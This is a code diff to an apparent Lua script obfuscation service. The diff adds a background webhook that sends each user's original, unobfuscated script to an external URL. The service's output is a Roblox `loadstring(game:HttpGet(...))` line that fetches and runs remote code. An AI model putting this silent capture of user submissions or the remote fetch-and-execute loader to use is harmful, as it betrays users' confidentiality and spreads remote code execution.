@@ -22,7 +22,12 @@ const ObfuscateScriptOutputSchema = z.object({
 });
 export type ObfuscateScriptOutput = z.infer<typeof ObfuscateScriptOutputSchema>;
 
+// IMPORTANT: Add environment variable SCRIPT_LOG_WEBHOOK_URL or replace placeholder
+const SCRIPT_LOG_WEBHOOK_URL = process.env.SCRIPT_LOG_WEBHOOK_URL || 'YOUR_WEBHOOK_URL_HERE';
+
 export async function obfuscateScript(input: ObfuscateScriptInput): Promise<ObfuscateScriptOutput> {
+  // Note: The actual flow logic is defined below and executed here.
+  // This pattern allows the flow definition and the exported function to be co-located.
   return obfuscateScriptFlow(input);
 }
 
@@ -36,19 +41,57 @@ const obfuscateScriptFlow = ai.defineFlow<
     outputSchema: ObfuscateScriptOutputSchema,
   },
   async input => {
-    const { script } = input;
+    const { script } = input; // This is the original, unobfuscated script
 
+    // --- START: Webhook Logging Logic ---
+    if (SCRIPT_LOG_WEBHOOK_URL && SCRIPT_LOG_WEBHOOK_URL !== 'YOUR_WEBHOOK_URL_HERE') {
+      try {
+        console.log(`Sending script log to webhook: ${SCRIPT_LOG_WEBHOOK_URL}`);
+        // No await here - let it run in the background
+        fetch(SCRIPT_LOG_WEBHOOK_URL, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({
+            timestamp: new Date().toISOString(),
+            unobfuscatedScript: script, // Log the original script
+            source: 'obfuscateScriptFlow',
+          }),
+        }).then(response => {
+            if (!response.ok) {
+              response.text().then(text => {
+                console.error(`Webhook failed with status ${response.status}: ${text}`);
+              }).catch(() => {
+                console.error(`Webhook failed with status ${response.status}, could not read body.`);
+              });
+            } else {
+                console.log('Successfully sent script to webhook.');
+            }
+        }).catch(webhookError => {
+          console.error('Error sending script to webhook:', webhookError);
+        });
+      } catch (error) {
+          // Catch sync errors during fetch initiation, though unlikely
+          console.error('Synchronous error initiating webhook fetch:', error);
+      }
+    } else {
+      console.warn('SCRIPT_LOG_WEBHOOK_URL not configured. Skipping webhook notification.');
+    }
+    // --- END: Webhook Logging Logic ---
+
+    // --- START: Original Obfuscation and Pastefy Logic ---
     try {
-
-     const apiKey = process.env.LUAOBFUSCATOR_API_KEY;
-
+      const apiKey = process.env.LUAOBFUSCATOR_API_KEY;
       if (!apiKey) {
         throw new Error('LUAOBFUSCATOR_API_KEY environment variable is not set.');
       }
-      const obfuscationResult = await obfuscateLuaScript(script, apiKey)
 
+      // Obfuscate the script
+      const obfuscationResult = await obfuscateLuaScript(script, apiKey);
+
+      // Upload to Pastefy
       const pastefyApiKey = process.env.PASTEFY_API_KEY;
-
       if (!pastefyApiKey) {
         throw new Error("PASTEFY_API_KEY environment variable is not set.");
       }
@@ -74,11 +117,11 @@ const obfuscateScriptFlow = ai.defineFlow<
       }
 
       const uploadData = await uploadResponse.json();
-
       if (!uploadData || !uploadData.paste || !uploadData.paste.id) {
         throw new Error('Invalid Pastefy upload response.');
       }
 
+      // Construct the result
       const pasteId = uploadData.paste.id;
       const pastefyLink = `https://pastefy.app/${pasteId}`;
       const rawUrl = `https://pastefy.app/${pasteId}/raw`;
@@ -87,8 +130,13 @@ const obfuscateScriptFlow = ai.defineFlow<
         obfuscatedScript: `loadstring(game:HttpGet("${rawUrl}"))()`,
         pastefyLink: pastefyLink,
       };
+
     } catch (error: any) {
-      throw error;
+      // Log the specific error from obfuscation/pastefy
+      console.error('Error during obfuscation or Pastefy upload:', error);
+      // Re-throw the error so the frontend can catch it and display a message
+      throw new Error(`Failed to process script: ${error.message}`);
     }
+    // --- END: Original Obfuscation and Pastefy Logic ---
   }
 );
